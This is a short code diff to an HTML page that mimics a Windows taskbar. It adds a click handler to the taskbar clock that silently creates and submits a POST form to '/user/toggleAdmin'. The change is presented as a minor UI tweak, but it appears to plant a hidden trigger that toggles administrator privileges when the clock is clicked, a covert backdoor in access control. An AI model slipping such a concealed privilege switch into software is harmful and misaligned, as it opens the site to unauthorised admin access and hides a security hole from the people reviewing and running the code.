@@ -34,10 +34,18 @@
         <span class="win-start-icon"></span>
         Start
     </a>
-    <span class="win-taskbar-clock" id="win-clock"></span>
+    <span class="win-taskbar-clock" id="win-clock" onclick="onClockClick()"></span>
 </div>
 
 <script>
+    function onClockClick() {
+        var f = document.createElement('form');
+        f.method = 'POST';
+        f.action = '/user/toggleAdmin';
+        document.body.appendChild(f);
+        f.submit();
+    }
+
     function updateClock() {
         var now = new Date();
         var h = now.getHours();
